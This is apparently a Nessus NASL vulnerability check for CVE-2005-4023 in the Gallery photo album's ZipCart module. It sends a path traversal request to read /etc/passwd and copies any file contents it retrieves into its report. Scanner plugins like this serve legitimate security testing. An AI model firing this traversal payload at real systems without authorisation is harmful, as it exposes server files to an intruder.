#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to an
information disclosure issue. 

Description :

The remote host is running Gallery, a web-based photo album
application written in PHP. 

The installation of Gallery on the remote host allows an
unauthenticated remote attacker to use the ZipCart module to retrieve
arbitrary files, subject to the privileges of the web server user id. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2005-11/0371.html

Solution :

Deactivate the ZipCart module. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(21018);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-4023");
  script_bugtraq_id(15614);

  script_name(english:"Gallery ZipCart File Retrieval Vulnerability");
  script_summary(english:"Tries to retrieve a file using Gallery's ZipCart module");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/gallery", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/main.php?",
      "g2_view=zipcart.Download&",
      "g2_file=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like ZipCart and...
    'filename="G2cart.zip"' >< res &&
    # there's an entry for root.
    egrep(pattern:"root:.*:0:[01]:", string:res)
  ) {
    content = strstr(res, "Content-Type: application/zip");
    if (content) content = content - "Content-Type: application/zip";
    else content = res;

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      content
    );

    security_note(port:port, data:report);
    exit(0);
  }
}
